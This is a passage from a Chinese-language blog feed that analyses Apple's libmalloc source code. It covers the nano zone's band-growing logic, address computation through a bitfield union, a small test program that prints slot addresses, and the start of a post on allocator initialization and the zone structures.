class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == pMeta-&gt;slot_current_base_addr) &#123; <span class="comment">// First encounter?</span></span><br><span class="line"></span><br><span class="line">		u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">		u.fields.nano_mag_index = mag_index;</span><br><span class="line">		u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">		u.fields.nano_slot = (slot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">		u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		p = u.addr;</span><br><span class="line">		<span class="comment">//使用union计算地址是多少</span></span><br><span class="line">		pMeta-&gt;slot_bytes = slot_bytes;</span><br><span class="line">		pMeta-&gt;slot_objects = SLOT_IN_BAND_SIZE / slot_bytes;  <span class="comment">//128KB/slot_bytes==&gt;有多少个分片。</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p = pMeta-&gt;slot_current_base_addr + BAND_SIZE; <span class="comment">// Growing, so stride ahead by BAND_SIZE 1&lt;&lt;21 ==&gt; 2^21</span></span><br><span class="line">		<span class="comment">//再slot_current_base_addr再增加2</span></span><br><span class="line">		u.addr = (<span class="keyword">uint64_t</span>)p;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == u.fields.nano_band) <span class="comment">// Did the band index wrap?</span></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		assert(slot_bytes == pMeta-&gt;slot_bytes);</span><br><span class="line">	&#125;</span><br><span class="line">	pMeta-&gt;slot_current_base_addr = p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//band_size大小是2MB</span></span><br><span class="line">	<span class="comment">//根据当前slot_current_base_addr，计算得到band的开始地址，用于内存申请。</span></span><br><span class="line">	<span class="keyword">mach_vm_address_t</span> vm_addr = p &amp; ~((<span class="keyword">uintptr_t</span>)(BAND_SIZE - <span class="number">1</span>)); <span class="comment">// Address of the (2MB) band covering this (128KB) slot</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;band_max_mapped_baseaddr[mag_index] &lt; vm_addr) &#123;</span><br><span class="line">		<span class="comment">// Obtain the next band to cover this slot</span></span><br><span class="line">		<span class="comment">// 申请2MB的空间用于这个band</span></span><br><span class="line">		<span class="keyword">kern_return_t</span> kr = mach_vm_map(mach_task_self(), &amp;vm_addr, BAND_SIZE,</span><br><span class="line">		                               <span class="number">0</span>, VM_MAKE_TAG(VM_MEMORY_MALLOC_NANO), MEMORY_OBJECT_NULL, <span class="number">0</span>, FALSE,</span><br><span class="line">		                               VM_PROT_DEFAULT, VM_PROT_ALL, VM_INHERIT_DEFAULT);</span><br><span class="line">      	<span class="comment">/* ...*/</span></span><br><span class="line">		nanozone-&gt;band_max_mapped_baseaddr[mag_index] = vm_addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Randomize the starting allocation from this slot (introduces 11 to 14 bits of entropy)</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == pMeta-&gt;slot_objects_mapped) &#123; <span class="comment">// First encounter?</span></span><br><span class="line">		<span class="comment">//SLOT_IN_BAND_SIZE / slot_bytes 这个slot会被分成多少份。</span></span><br><span class="line">		pMeta-&gt;slot_objects_skipped = (malloc_entropy[<span class="number">1</span>] % (SLOT_IN_BAND_SIZE / slot_bytes));</span><br><span class="line">		<span class="comment">//通过取余在内存开始处空出几个slot_bytes不用。</span></span><br><span class="line">		pMeta-&gt;slot_bump_addr = p + (pMeta-&gt;slot_objects_skipped * slot_bytes);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		pMeta-&gt;slot_bump_addr = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pMeta-&gt;slot_limit_addr = p + (SLOT_IN_BAND_SIZE / slot_bytes) * slot_bytes; <span class="comment">//p+128KB</span></span><br><span class="line">	pMeta-&gt;slot_objects_mapped += (SLOT_IN_BAND_SIZE / slot_bytes); <span class="comment">//128KB/slot_bytes</span></span><br><span class="line"></span><br><span class="line">	u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">	u.fields.nano_mag_index = mag_index;</span><br><span class="line">	u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">	u.fields.nano_slot = <span class="number">0</span>;</span><br><span class="line">	u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line">	s = u.addr; <span class="comment">// Base for this core.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set the high water mark for this CPU's entire magazine, if this resupply raised it.</span></span><br><span class="line">    watermark = nanozone-&gt;core_mapped_size[mag_index];</span><br><span class="line">    hiwater = MAX( watermark, p - s + SLOT_IN_BAND_SIZE );</span><br><span class="line">    nanozone-&gt;core_mapped_size[mag_index] = hiwater;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="获取pMeta-&gt;slot_current_base_addr">获取pMeta-&gt;slot_current_base_addr</h5><p>第一次调用<code>segregated_band_grow</code>，因为<code>0 == pMeta-&gt;slot_current_base_addr</code>，所以进行初始化，利用</p>
<p><code>nano_blk_addr_t</code>这个结构，计算当前的<code>slot_current_base_addr</code>的地址是多少。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> nano_blk_addr_s &#123;</span><br><span class="line">	<span class="keyword">uint64_t</span></span><br><span class="line">nano_offset:NANO_OFFSET_BITS,		<span class="comment">// locates the block</span></span><br><span class="line">nano_slot:NANO_SLOT_BITS,		<span class="comment">// bucket of homogenous quanta-multiple blocks</span></span><br><span class="line">nano_band:NANO_BAND_BITS,</span><br><span class="line">nano_mag_index:NANO_MAG_BITS,		<span class="comment">// the core that allocated this block</span></span><br><span class="line">nano_signature:NANO_SIGNATURE_BITS;	<span class="comment">// 0x00006nnnnnnnnnnn the address range devoted to us.</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span>  &#123;</span><br><span class="line">	<span class="keyword">uint64_t</span>			addr;</span><br><span class="line">	<span class="keyword">struct</span> nano_blk_addr_s	fields;</span><br><span class="line">&#125; <span class="keyword">nano_blk_addr_t</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*...*/</span></span><br><span class="line">		u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">		u.fields.nano_mag_index = mag_index;</span><br><span class="line">		u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">		u.fields.nano_slot = (slot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">		u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		p = u.addr;</span><br><span class="line">		<span class="comment">/*...*/</span></span><br></pre></td></tr></table></figure>
<p>先根据不同的<code>mag_index</code>和<code>slot_bytes</code>填写<code>union</code>中的<code>fileds</code>。因为<code>union</code>使用不同的数据类型范围同一块内存。所以用<code>u.addr</code>来获取前面填入的数据，就得到了当前的<code>slot_current_base_addr</code>。</p>
<p>通过一段简单的代码来验证一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nano_blk_addr_t</span> u;</span><br><span class="line"> <span class="keyword">uintptr_t</span> p;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"mag,band,slot,addr"</span>);</span><br><span class="line"> <span class="keyword">int</span> imag=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">int</span> iband=<span class="number">0</span> ;</span><br><span class="line"> <span class="keyword">int</span> islot_bytes=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span> (imag = <span class="number">0</span>;imag!=<span class="number">32</span>;imag++) &#123;</span><br><span class="line">     <span class="keyword">for</span> (iband = <span class="number">0</span> ; iband!=<span class="number">2</span> ; iband++) &#123;</span><br><span class="line">         <span class="keyword">for</span> (islot_bytes=<span class="number">16</span>;islot_bytes!=<span class="number">256</span>+<span class="number">16</span>;islot_bytes = islot_bytes + <span class="number">16</span>) &#123;</span><br><span class="line">             u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">             u.fields.nano_mag_index = imag;</span><br><span class="line">             u.fields.nano_band = iband;</span><br><span class="line">             u.fields.nano_slot = (islot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">             u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">             p = u.addr;</span><br><span class="line">             <span class="comment">//mach_vm_address_t vm_addr = p &amp; ~((uintptr_t)(BAND_SIZE - 1));</span></span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\n%d,%d,%d,%llx"</span>,imag,iband,islot_bytes,u.addr);</span><br><span class="line">    </span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>打印的结果太多了，这里就整理出比较有特征的几个结果，用作分析。</p>
<table>
<thead>
<tr>
<th>mag</th>
<th>band</th>
<th>slot</th>
<th>addr</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>16</td>
<td>0x600000000000</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>32</td>
<td>0x600000020000</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>256</td>
<td>0x6000001e0000</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>16</td>
<td>0x600000200000</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>256</td>
<td>0x6000003e0000</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>16</td>
<td>0x608000000000</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>16</td>
<td>0x608000200000</td>
</tr>
</tbody>
</table>
<p>表-1</p>
<p>可以明显看出有一下几个特性</p>
<ul>
<li>所有的<code>band</code>基址是从<code>0x600000000000</code>开始的。</li>
<li>每一个<code>cpu</code>单独使用一个<code>band</code>：<code>mag</code>不同的时候，<code>band</code>号为0，<code>slot_bytes</code>为16时，两个<code>addr</code>不同。</li>
<li>同一个<code>cpu</code>的一个<code>band</code>用完之后，线性的申请下一个<code>band</code>。</li>
<li>相同的<code>band</code>，即<code>band</code>号相同时,0x200000(2MB)的空间，被划分为0x10(16)个，大小为0x2000(128KB)的<code>slot</code>。且为线性分布。</li>
</ul>
<p>而不是第一次调用的情况则十分简单，直接在<code>slot_current_base_addr</code>的基础上添加<code>BAND_SIZE</code>，也就是2MB(0x200000)获取新的<code>slot_current_base_addr</code>。</p>
<p>例如：</p>
<p>当<code>band</code>为0，<code>slot_bytes</code>为256时，新的<code>slot_current_base_addr</code>为</p>
<blockquote>
<p>0x6000001e0000+0x200000=0x6000003e0000</p>
</blockquote>
<p>与表-1中结果一致。</p>
<p>余下的代码比较好理解，就是根据计算出来的地址，想内核申请内存，且根据相关数据填写<code>pMeta</code>的的数据，在下一次调用<code>malloc</code>时，非常方便的从已经处理好的<code>pMeta</code>中获取内存空间。再根据pMeta中相关的数据，计算得到需要返回给调用者的指针。</p>
<h1 id="nano_free">nano_free</h1><p><code>free</code>的操作，相对简单，就是将不用的内存，添加到每一个pMeta的队列之中，而每一个队列，在<code>malloc</code>时，如果发现需要使用的队列中存在元素，则优先使用队列中已经释放的内存。</p>
<p>逻辑相对简单，就不对源码做出分析了，有兴趣的读者可以自行阅读源码。相信在了解了上面流程之后，不是一件难的事情。</p>
<h1 id="小结">小结</h1><p><code>nano</code>的内存分配逻辑相对简单，和之前分析过的<code>linux</code><a href="http://turingh.github.io/2015/12/14/protostar-heap3/">堆内存的分配策略</a>是不同的，在所申请的内存范围很小的时候，可以加快申请的速度，并且提高内存的复用。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="摘要">摘要</h1><p>根据申请内存的大小不同，<code>libmalloc</code>会从不同的堆上空间将内存分配给申请者，而最小的一个一档，是从<code>nano_zone_s</code>中，通过<code>nano_*</code>函数获取堆上已分配的内存。</p>]]>
    
    </summary>
    
      <category term="malloc" scheme="http://turingh.github.io/tags/malloc/"/>
    
      <category term="nano" scheme="http://turingh.github.io/tags/nano/"/>
    
      <category term="基本功要扎实" scheme="http://turingh.github.io/tags/%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%A6%81%E6%89%8E%E5%AE%9E/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[libmalloc源码分析之初始化]]></title>
    <link href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/"/>
    <id>http://turingh.github.io/2016/06/28/libmalloc源码分析之初始化/</id>
    <published>2016-06-28T19:22:51.000Z</published>
    <updated>2016-06-28T22:04:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="摘要">摘要</h1><p>为了加深对<code>OS X</code>系统在应用层堆内存分配的了解，对<code>libmalloc</code>进行了阅读与理解。</p>
<ul>
<li>加强对堆上内存分布的理解</li>
<li>遇到内存泄露问题需要处理时，对堆分配策略的了解，可以提高分析的速度与精确度</li>
<li>遇到堆内存漏洞利用时，可以更加清楚的理解<code>EXP</code>的原理，做出更精准的分析</li>
</ul>
<p>阅读本文之前可以先稍微了解一下<code>OS X</code>在堆上的内存处理的大致情况，点<a href="https://yq.aliyun.com/articles/3065" target="_blank" rel="external">这里</a>。了解大致情况之后，才能更好的理解源码的设计。</p>
<a id="more"></a>
<h1 id="从malloc开始">从malloc开始</h1><h2 id="初始化">初始化</h2><p>所有的逻辑都是在应用层调用<code>malloc</code>函数时开始的，这里是<code>malloc</code>函数的实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc</span><span class="params">(size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*retval;</span><br><span class="line">	retval = malloc_zone_malloc(inline_malloc_default_zone(), size);</span><br><span class="line">	<span class="keyword">if</span> (retval == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*......*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> malloc_zone_t *</span><br><span class="line"><span class="title">inline_malloc_default_zone</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!_malloc_is_initialized) _malloc_initialize();</span><br><span class="line">	<span class="comment">// _malloc_printf(ASL_LEVEL_INFO, "In inline_malloc_default_zone with %d %d\n", malloc_num_zones, malloc_has_debug_zone);</span></span><br><span class="line">	<span class="keyword">return</span> malloc_zones[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显可以看出，<code>libmalloc</code>是在第一次调用<code>malloc</code>函数的的时候，通过<code>inline_malloc_default_zone</code>来进行堆上数据的初始化。而<code>inline_malloc_default_zone</code>函数最终会调用<code>_malloc_initialize</code>来完成最终的内存空间初始化。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_malloc_initialize(<span class="keyword">void</span>) &#123;</span><br><span class="line">	MALLOC_LOCK();</span><br><span class="line">	<span class="keyword">if</span> (!_malloc_is_initialized) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> n;</span><br><span class="line">		<span class="keyword">malloc_zone_t</span>	*zone;</span><br><span class="line">		_malloc_is_initialized = TRUE;</span><br><span class="line">		set_flags_from_environment(); <span class="comment">// will only set flags up to two times</span></span><br><span class="line">		n = malloc_num_zones;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CONFIG_NANOZONE <span class="comment">//可以通过宏控制是否使用nano_zone.</span></span></span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//创建一个会变化的zone</span></span><br><span class="line">		<span class="keyword">malloc_zone_t</span> *helper_zone = create_scalable_zone(<span class="number">0</span>, malloc_debug_flags);</span><br><span class="line">		<span class="comment">//创建一个nano_zone,使用helper_zone作为nano_zone的</span></span><br><span class="line">      	zone = create_nano_zone(<span class="number">0</span>, helper_zone, malloc_debug_flags);</span><br><span class="line">	</span><br><span class="line">      	<span class="comment">/*...*/</span></span><br><span class="line">    &#125;</span><br><span class="line">	MALLOC_UNLOCK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="malloc_zone_t、szone_t、nanozone_t">malloc_zone_t、szone_t、nanozone_t</h3><p>这里需要先了解一下在堆空间初始化中，非常重要的两个数据结构。<code>malloc_zone_t</code>和<code>szone_t</code>。</p>
<h4 id="malloc_zone_t">malloc_zone_t</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> &#123;</span><br><span class="line">    <span class="comment">/* Only zone implementors should depend on the layout of this structure;</span><br><span class="line">    Regular callers should use the access functions below */</span></span><br><span class="line">    <span class="keyword">void</span>	*reserved1;	<span class="comment">/* RESERVED FOR CFAllocator DO NOT USE */</span></span><br><span class="line">    <span class="keyword">void</span>	*reserved2;	<span class="comment">/* RESERVED FOR CFAllocator DO NOT USE */</span></span><br><span class="line">    <span class="keyword">size_t</span> 	(*size)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">const</span> <span class="keyword">void</span> *ptr); <span class="comment">/* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */</span></span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">malloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size);</span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">calloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> num_items, <span class="keyword">size_t</span> size); <span class="comment">/* same as malloc, but block returned is set to zero */</span></span><br><span class="line">    <span class="keyword">void</span> 	*(*valloc)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size); <span class="comment">/* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */</span></span><br><span class="line">    <span class="keyword">void</span> 	(*<span class="built_in">free</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr);</span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">realloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size);</span><br><span class="line">    <span class="keyword">void</span> 	(*destroy)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone); <span class="comment">/* zone is destroyed and all memory reclaimed */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>	*zone_name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optional batch callbacks; these may be NULL */</span></span><br><span class="line">    <span class="keyword">unsigned</span>	(*batch_malloc)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size, <span class="keyword">void</span> **results, <span class="keyword">unsigned</span> num_requested); <span class="comment">/* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */</span></span><br><span class="line">    <span class="keyword">void</span>	(*batch_free)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> **to_be_freed, <span class="keyword">unsigned</span> num_to_be_freed); <span class="comment">/* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span>	*introspect;</span><br><span class="line">    <span class="keyword">unsigned</span>	version;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */</span></span><br><span class="line">    <span class="keyword">void</span> *(*memalign)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> alignment, <span class="keyword">size_t</span> size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/</span></span><br><span class="line">    <span class="keyword">void</span> (*free_definite_size)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */</span></span><br><span class="line">    <span class="keyword">size_t</span> 	(*pressure_relief)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> goal);</span><br><span class="line">&#125; <span class="keyword">malloc_zone_t</span>;</span><br></pre></td></tr></table></figure>
<p><code>malloc_zone_t</code>非常简单，就是一堆函数指针，用来存储一堆相关的处理函数的具体实现的地址，例如<code>malloc</code>、<code>free</code>、<code>realloc</code>等函数的具体实现。</p>
<h4 id="szone_t、nanozone_t">szone_t、nanozone_t</h4><p><code>szone_t</code>其实与<code>malloc_zone_t</code>所描述的是同一块<code>zone</code>，但是<code>szone_t</code>的结构中存有大量的<code>libmalloc</code>内部逻辑会使用到的数据结构。他的结构体重第一个组成部分就是malloc_zone_t。</p>
<p>可以理解为，<code>szone_t</code>结构用来描述了这一块堆上初始化出来的<code>zone</code>的所有内部属性和状态，而<code>malloc_zone_t</code>是对外提供的用来处理该<code>zone</code>内部数据的所有接口。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> szone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		cpu_id_key;		<span class="comment">// unused</span></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">void</span>			*log_address;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Regions for tiny objects */</span></span><br><span class="line">	_malloc_lock_s	tiny_regions_lock CACHE_ALIGN;</span><br><span class="line">	<span class="keyword">size_t</span>			num_tiny_regions;</span><br><span class="line">	<span class="keyword">size_t</span>			num_tiny_regions_dealloc;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	*tiny_region_generation;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	trg[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>				num_tiny_magazines;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_tiny_magazines_mask;</span><br><span class="line">	<span class="keyword">int</span>				num_tiny_magazines_mask_shift;</span><br><span class="line">	<span class="keyword">magazine_t</span>			*tiny_magazines; <span class="comment">// array of per-processor magazines</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uintptr_t</span>			last_tiny_advise;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Regions for small objects */</span></span><br><span class="line">	_malloc_lock_s	small_regions_lock CACHE_ALIGN;</span><br><span class="line">	<span class="keyword">size_t</span>			num_small_regions;</span><br><span class="line">	<span class="keyword">size_t</span>			num_small_regions_dealloc;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	*small_region_generation;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	srg[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			num_small_slots; <span class="comment">// determined by physmem size</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>				num_small_magazines;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_small_magazines_mask;</span><br><span class="line">	<span class="keyword">int</span>				num_small_magazines_mask_shift;</span><br><span class="line">	<span class="keyword">magazine_t</span>			*small_magazines; <span class="comment">// array of per-processor magazines</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uintptr_t</span>			last_small_advise;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* large objects: all the rest */</span></span><br><span class="line">	_malloc_lock_s		large_szone_lock CACHE_ALIGN; <span class="comment">// One customer at a time for large</span></span><br><span class="line">	<span class="keyword">unsigned</span>			num_large_objects_in_use;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_large_entries;</span><br><span class="line">	<span 